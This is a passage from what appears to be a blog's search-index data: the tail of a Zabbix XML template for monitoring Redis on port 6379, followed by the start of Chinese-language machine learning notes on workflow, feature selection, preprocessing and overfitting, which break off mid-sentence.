&lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Used memory_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,used_memory:]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Used_memory_rss_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,used_memory_rss]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;/items&gt; &lt;discovery_rules/&gt; &lt;macros/&gt; &lt;templates/&gt; &lt;screens/&gt; &lt;/template&gt; &lt;/templates&gt; &lt;triggers&gt; &lt;trigger&gt; &lt;expression&gt;{Templates Redis_6379:net.tcp.listen[6379].count(#3,0,&amp;quot;eq&amp;quot;)}=3&lt;/expression&gt; &lt;name&gt;Redis port 6379 is not running&lt;/name&gt; &lt;url/&gt; &lt;status&gt;0&lt;/status&gt; &lt;priority&gt;4&lt;/priority&gt; &lt;description/&gt; &lt;type&gt;0&lt;/type&gt; &lt;dependencies/&gt; &lt;/trigger&gt; &lt;/triggers&gt; &lt;graphs&gt; &lt;graph&gt; &lt;name&gt;Redis key_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,evicted_keys]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00C800&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,expired_keys]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Last_save_time_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,last_save_time]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Port Connections_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;0&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;EE0000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,blocked_clients]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;BBBB00&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,total_connections_received]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;2&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;CC00CC&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,total_commands_processed]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;3&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00CCCC&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,connected_slave]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;4&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;009900&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,connected_clients]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Port status_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;net.tcp.listen[6379]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Uptime_in_seconds_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,uptime_in_seconds]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Used memory_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,used_memory:]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00C8C8&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,used_memory_rss]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;/graphs&gt;&lt;/zabbix_export&gt;","link":"/2016/10/02/zabbix%E7%9B%91%E6%8E%A7redis/"},{"title":"机器学习笔记","text":"置顶 理解矩阵 显卡、GPU和CUDA简介 OpenCV、OpenCV、CUDA python Flask WEB微框架 有监督、无监督与半监督学习 判别式模型与生成式模型 机器学习项目开发流程 过拟合？欠拟合？ 防止过拟合的方法 机器学习中，有哪些特征选择的工程方法 如何进行特征选择 你知道有哪些数据处理和特征工程的处理 数据预处理 数据不平衡问题 特征向量的归一化方法有哪些 机器学习中，为何要经常对数据做归一化 哪些机器学习算法不需要做归一化处理 对于树形结构为什么不需要归一化 标准化与归一化的区别 模型评估指标 ROC与AUC 常见损失函数 除了MSE，还有哪些模型效果判断方法？区别是什么 线性分类器与非线性分类器的区别以及优劣 对于维度极低的特征，选择线性还是非线性分类器 常见的分类算法有哪些 特征比数据量还大时，选择什么样的分类器 PCA_吴恩达 异常值检测_吴恩达 推荐系统_吴恩达 协同过滤和基于内容推荐有什么区别 回归算法 示例代码 什么是回归算法 回归算法推导：目标函数、对数似然及最小二乘 回归怎么预防过拟合 回归要调的参数有哪些 局部加权回归 Softmax回归 梯度的定义 什么是梯度下降？为什么要用梯度下降 梯度下降法容易收敛到局部最优，为什么应用广泛 梯度下降法找到的一定是下降最快的方向么 BGD、SGD、MBGD介绍与区别 BGD、SGD、MBGD的推导 牛顿法 拟牛顿法 牛顿法和梯度下降法的区别 共轭梯度 什么是正则化？L1正则与L2正则介绍 正则化为什么可以防止过拟合 L1和L2的区别 L1和L2正则先验分别服从什么分布 简单介绍下LR LR与线性回归的区别与联系 LR模型为什么要使用sigmoid函数 逻辑回归相关问题 逻辑回归为什么要对特征进行离散化 逻辑回归并行化怎么做，有几种并行化方式，读过哪些开源的实现 决策树、随机森林和提升算法 示例代码 信息熵、联合熵、条件熵、相对熵、互信息的定义 什么是最大熵 什么是决策树 决策树构建过程 决策树的纯度 ID3、C4.5、CART介绍 决策树优化策略 集成方法 bootstrap, boosting, bagging 简介 提升算法 Adboost、GBDT、Xgboost 简介 GBDT简介 从回归树到GBDT GBDT与随机森林 GBDT与XGBOOST 支持向量机 示例代码 SVM目标函数推导 大边界的直观理解与数学解释 核函数 常用核函数及核函数的条件 逻辑回归、SVM和神经网络使用场景 吴恩达SVM视频笔记 支持向量机通俗导论（理解SVM的三层境界） 带核的SVM为什么能分类非线性问题 贝叶斯 示例代码 贝叶斯定理相关公式 条件概率和后验概率区别 朴素贝叶斯 高斯朴素贝叶斯 伯努利朴素贝叶斯 多项式朴素贝叶斯 贝叶斯网络 怎么通俗易懂地解释贝叶斯网络和它的应用 用贝叶斯机率说明Dropout的原理 如何用贝叶斯算法实现垃圾邮件检测 当你输入错误单词时，搜索引擎会进行拼写检查并提示正确单词，如何用贝叶斯算法实现相关逻辑 KNN 简述KNN算法过程 KNN中的K如何选取的 kmeans kmeans的复杂度 优化Kmeans KMeans初始类簇中心点的选取。 在k-means或kNN，我们是用欧氏距离来计算最近的邻居之间的距离。为什么不用曼哈顿距离 常用的聚类划分方式有哪些列举代表算法 说说常见的损失函数 协方差和相关性有什么区别 谈谈判别式模型和生成式模型 LR与线性回归的区别与联系 LR和SVM的联系与区别 SVM、LR、决策树的对比 请比较下EM算法、HMM、CRF RF与GBDT之间的区别与联系 请问（决策树、Random Forest、Booting、Adaboot）GBDT和XGBoost的区别是什么 对所有优化问题来说， 有没有可能找到比現在已知算法更好的算法 说说常见的优化算法及其优缺点 请大致对比下plsa和LDA的区别 请简要说说EM算法 什么最小二乘法 解释对偶的概念 试证明样本空间任意点x到超平面(w，b)的距离为(6.2) 什么是共线性， 跟过拟合有什么关联 什么是ill-condition病态问题 如何准备机器学习工程师的面试 如何判断某个人的机器学习水平 理解矩阵有人说，矩阵的本质就是线性方程式，两者是一一对应关系链接：http://www.ruanyifeng.com/blog/2015/09/matrix-multiplication.html 也有人说，矩阵的本质是运动的描述。简而言之，就是在线性空间中选定基之后，向量刻画对象，矩阵刻画对象的运动，用矩阵与向量的乘法施加运动。链接：https://pan.baidu.com/s/1BLyrQH5_VAw832jKkCgpBA 密码：ljwq 机器学习项目开发流程1 抽象成数学问题机器学习的训练过程很耗时，胡乱尝试时间成本太高，所以明确问题是进行机器学习的第一步。抽象成数学问题，指的明确我们可以获得什么样的数据，目标问题属于分类、回归还是聚类，如果都不是，如何转换为其中的某类问题。 2 获取数据数据决定了机器学习结果的上限，而算法只是尽可能逼近这个上限。数据要有代表性，否则必然会过拟合。而且对于分类问题，数据偏斜不能过于严重，不同类别的数据数量不要有数个数量级的差距。对数据的量级有一个评估，多少个样本，多少个特征，可以估算出其对内存的消耗程度，判断训练过程中内存是否能够放得下。如果放不下就得考虑改进算法或者使用一些降维的技巧了。如果数据量实在太大，那就要考虑分布式了。 3 特征预处理与特征选择良好的数据要能够提取出良好的特征才能真正发挥效力。特征预处理、数据清洗是很关键的步骤，往往能够使得算法的效果和性能得到显著提高。归一化、离散化、因子化、缺失值处理、去除共线性等，数据挖掘过程中很多时间就花在它们上面。这些工作简单可复制，收益稳定可预期，是机器学习的基础必备步骤。 筛选出显著特征、摒弃非显著特征，需要机器学习工程师反复理解业务。这对很多结果有决定性的影响。特征选择好了，非常简单的算法也能得出良好、稳定的结果。这需要运用特征有效性分析的相关技术，如相关系数、卡方检验、平均互信息、条件熵、后验概率、逻辑回归权重等方法。 4 训练模型与调优直到这一步才用到我们上面说的算法进行训练。现在很多算法都能够封装成黑盒供人使用。但是真正考验水平的是调整这些算法的（超）参数，使得结果变得更加优良。这需要我们对算法的原理有深入的理解。理解越深入，就越能发现问题的症结，提出良好的调优方案。 5 模型诊断如何确定模型调优的方向与思路呢这就需要对模型进行诊断的技术。过拟合、欠拟合 判断是模型诊断中至关重要的一步。常见的方法如交叉验证，绘制学习曲线等。过拟合的基本调优思路是增加数据量，降低模型复杂度。欠拟合的基本调优思路是提高特征数量和质量，增加模型复杂度。 误差分析，也是机器学习至关重要的步骤。通过观察误差样本，全面分析误差产生误差的原因:是参数的问题还是算法选择的问题，是特征的问题还是数据本身的问题……诊断后的模型需要进行调优，调优后的新模型需要重新进行诊断，这是一个反复迭代不断逼近的过程，需要不断地尝试， 进而达到最优状态。 6 模型融合一般来说，模型融合后都能使得效果有一定提升。而且效果很好。工程上，主要提升算法准确度的方法是分别在模型的前端（特征清洗和预处理，不同的采样模式）与后端（模型融合）上下功夫。因为他们比较标准可复制，效果比较稳定。而直接调参的工作不会很多，毕竟大量数据训练起来太慢了，而且效果难以保证。 7 上线运行这一部分内容主要跟工程实现的相关性比较大。工程上是结果导向，模型在线上运行的效果直接决定模型的成败。 不单纯包括其准确程度、误差等情况，还包括其运行的速度(时间复杂度)、资源消耗程度（空间复杂度）、稳定性是否可接受。 有监督、无监督与半监督学习 有监督学习：对有标记的训练样本进行学习，对训练样本外的数据进行预测。如 LR（Logistic Regression），SVM（Support Vector Machine），RF（RandomForest），GBDT（Gradient Boosting Decision Tree），感知机（Perceptron）、BP神经网络（Back Propagation）等。 无监督学习：对未标记的样本进行训练学习，试图发现样本中的内在结构。如聚类(KMeans)、降维、文本处理、DL。 半监督学习(Semi-Supervised Learning，SSL)：主要考虑如何利用少量的标注样本和大量的未标注样本进行训练和分类，是有监督学习和无监督学习的结合。半监督学习对于减少标注代价，提高学习机器性能具有重大实际意义。 判别式模型与生成式模型判别式模型(Discriminative Model)：直接对条件概率p(y|x)进行建模，常见判别模型有：线性回归、决策树、支持向量机SVM、k近邻、神经网络、集成学习、条件随机场CRF等； 生成式模型(Generative Model)：对联合分布概率p(x,y)进行建模，常见生成式模型有：隐马尔可夫模型HMM、朴素贝叶斯模型、高斯混合模型GMM及其他混合模型、LDA和限制波兹曼机等； 生成式模型更普适，判别式模型更直接，目标性更强。生成式模型关注数据是如何产生的，寻找的是数据分布模型。判别式模型关注的数据的差异性，寻找的是分类面。由生成式模型可以产生判别是模型，但是由判别式模式没法形成生成式模型 机器学习中，有哪些特征选择的工程方法数据和特征决定了机器学习的上限，而模型和算法只是逼近这个上限而已 计算每一个特征与响应变量的相关性工程上常用的手段有计算皮尔逊系数和互信息系数，皮尔逊系数只能衡量线性相关性，而**互信息系数能够很好地度量各种相关性，但是计算相对复杂一些，好在很多toolkit里边都包含了这个工具（如sklearn的MINE），得到相关性之后就可以排序选择特征了； 构建单个特征的模型，通过模型的准确性为特征排序，借此来选择特征； 通过L1正则项来选择特征L1正则方法具有稀疏解的特性，因此天然具备特征选择的特性，但是要注意，L1没有选到的特征不代表不重要，原因是两个具有高相关性的特征可能只保留了一个，如果要确定哪个特征重要应再通过L2正则方法交叉检验； 训练能够对特征打分的预选模型RandomForest和Logistic Regression等都能对模型的特征打分，通过打分获得相关性后再训练最终模型； 通过特征组合后再来选择特征如对用户id和用户特征最组合来获得较大的特征集再来选择特征，这种做法在推荐系统和广告系统中比较常见，这也是所谓亿级甚至十亿级特征的主要来源，原因是用户数据比较稀疏，组合特征能够同时兼顾全局模型和个性化模型。 通过深度学习来进行特征选择目前这种手段正在随着深度学习的流行而成为一种手段，尤其是在计算机视觉领域，原因是深度学习具有自动学习特征的能力，这也是深度学习又叫unsupervised feature learning的原因。从深度学习模型中选择某一神经层的特征后就可以用来进行最终目标模型的训练了。 如何进行特征选择特征选择是一个重要的数据预处理过程，主要有两个原因：一是减少特征数量、降维，使模型泛化能力更强，减少过拟合;二是增强对特征和特征值之间的理解 常见的特征选择方式： 去除方差较小的特征，比如PCA 正则化。1正则化能够生成稀疏的模型。L2正则化的表现更加稳定，由于有用的特征往往对应系数非零。 随机森林，对于分类问题，通常采用基尼不纯度或者信息增益，对于回归问题，通常采用的是方差或者最小二乘拟合。一般不需要feature engineering、调参等繁琐的步骤。它的两个主要问题，1是重要的特征有可能得分很低（关联特征问题），2是这种方法对特征变量类别多的特征越有利（偏向问题）。 稳定性选择。是一种基于二次抽样和选择算法相结合较新的方法，选择算法可以是回归、SVM或其他类似的方法。它的主要思想是在不同的数据子集和特征子集上运行特征选择算法，不断的重复，最终汇总特征选择结果，比如可以统计某个特征被认为是重要特征的频率（被选为重要特征的次数除以它所在的子集被测试的次数）。理想情况下，重要特征的得分会接近100%。稍微弱一点的特征得分会是非0的数，而最无用的特征得分将会接近于0。 你知道有哪些数据处理和特征工程的处理 数据预处理1、特征向量的缺失值处理:1）缺失值较多.直接将该特征舍弃掉，否则可能反倒会带入较大的noise。2）缺失值较少，其余的特征缺失值都在10%以内，我们可以采取很多的方式来处理: 把NaN直接作为一个特征，假设用0表示； 连续值，用均值填充； 用随机森林等算法预测填充； 2、连续值：离散化。有的模型（如决策树）需要离散值3、对定量特征二值化。核心在于设定一个阈值，大于阈值的赋值为1，小于等于阈值的赋值为0。如图像操作4、皮尔逊相关系数，去除高度相关的列 在k-means或kNN，我们是用欧氏距离来计算最近的邻居之间的距离。为什么不用曼哈顿距离闵可夫斯基距离(Minkowski)（1）当p为1的时候是曼哈顿距离(Manhattan)（城市街区距离）（2）当p为2的时候是欧式距离(Euclidean)（又称欧几里得度量，最常见的两点之间或多点之间的距离表示法）（3）当p为无穷大的时候是切比雪夫距离(Chebyshev) 不用曼哈顿距离，因为它只计算水平或垂直距离，有维度的限制。而欧氏距离可用于任何空间的距离计算。因为数据点可以存在于任何空间，所以欧氏距离是更可行的选择。 但欧氏距离也有明显的缺点。它将样本不同属性（即各指标或各变量量纲）之间的差别等同看待，这一点有时不能满足实际要求。 曼哈顿距离和欧式距离一般用途不同，无相互替代性。 过拟合？欠拟合？欠拟合：算法不太符合样本的数据特征过拟合：算法太符合样本的数据特征，对实际生产中的数据特征却无法拟合 过拟合(overfitting)具体现象体现为，随着训练过程的进行，模型复杂度增加，在训练集上的错误率渐渐减小，但是在验证集上的错误率却渐渐增大。 特征过多，特征数量级过大，训练数据过少，都可能导致过度拟合。过拟合会让模型泛化能力变差。 防止过拟合的方法降低过拟合的办法一般如下： 通过特征选择/特征降维，使用更简单的模型：特征过多或者过复杂都会导致过拟合 数据集扩增：从数据源头获取、根据当前数据生成、数据增强等 交叉验证 集成方法 Bootstrap/Bagging 正则化(Regularization) L2正则化：目标函数中增加所有权重w参数的平方之和， 逼迫所有w尽可能趋向零但不为零. 因为过拟合的时候， 拟合函数需要顾忌每一个点， 最终形成的拟合函数波动很大， 在某些很小的区间里， 函数值的变化很剧烈， 也就是某些w非常大. 为此， L2正则化的加入就惩罚了权重变大的趋势. L1正则化：目标函数中增加所有权重w参数的绝对值之和， 逼迫更多w为零(也就是变稀疏. L2因为其导数也趋0， 奔向零的速度不如L1给力了). 大家对稀疏规则化趋之若鹜的一个关键原因在于它能实现特征的自动选择。一般来说，xi的大部分元素（也就是特征）都是和最终的输出yi没有关系或者不提供任何信息的，在最小化目标函数的时候考虑xi这些额外的特征，虽然可以获得更小的训练误差，但在预测新的样本时，这些没用的特征权重反而会被考虑，从而干扰了对正确yi的预测。稀疏规则化算子的引入就是为了完成特征自动选择的光荣使命，它会学习地去掉这些无用的特征，也就是把这些特征对应的权重置为0。 随机失活(dropout)在训练的运行的时候，让神经元以超参数p的概率被激活(也就是1-p的概率被设置为0)， 每个w因此随机参与， 使得任意w都不是不可或缺的， 效果类似于数量巨大的模型集成。 逐层归一化(batch normalization)这个方法给每层的输出都做一次归一化(网络上相当于加了一个线性变换层)， 使得下一层的输入接近高斯分布. 这个方法相当于下一层的w训练时避免了其输入以偏概全， 因而泛化效果非常好. 提前终止(early stopping)理论上可能的局部极小值数量随参数的数量呈指数增长， 到达某个精确的最小值是不良泛化的一个来源. 实践表明， 追求细粒度极小值具有较高的泛化误差。这是直观的，因为我们通常会希望我们的误差函数是平滑的， 精确的最小值处所见相应误差曲面具有高度不规则性， 而我们的泛化要求减少精确度去获得平滑最小值， 所以很多训练方法都提出了提前终止策略. 典型的方法是根据交叉叉验证提前终止: 若每次训练前， 将训练数据划分为若干份， 